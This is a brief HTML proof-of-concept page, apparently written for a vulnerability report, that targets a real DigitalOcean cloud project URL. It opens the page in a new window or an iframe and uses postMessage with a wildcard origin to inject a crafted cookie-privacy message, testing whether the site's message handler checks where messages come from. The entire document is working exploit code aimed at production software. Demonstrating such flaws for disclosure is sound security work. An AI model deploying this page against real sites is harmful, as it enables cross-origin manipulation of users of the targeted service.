
<!doctype html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>Postmessage PoC</title>
        <script>
            function pocLink() {
                let win = window.open('https://cloud.digitalocean.com/projects/5d7ae19f-5746-4733-9606-f290991f2e2e/resources?i=95967b');
                let msg = "cmapi_cookie_privacyxjma7gue0-";
                
                setTimeout(function(){
                    win.postMessage(msg, '*');
                }, 5000);
            }
            function pocFrame(win) {           
                let msg = "cmapi_cookie_privacyxjma7gue0-";
                
                win.postMessage(msg, '*');          
            }
        </script>
    </head>
    <body>
        <a href="#" onclick="pocLink();">PoC link</a>          
        <iframe src="https://cloud.digitalocean.com/projects/5d7ae19f-5746-4733-9606-f290991f2e2e/resources?i=95967b" onload="pocFrame(this.contentWindow)"></iframe>                    
    </body>
</html>
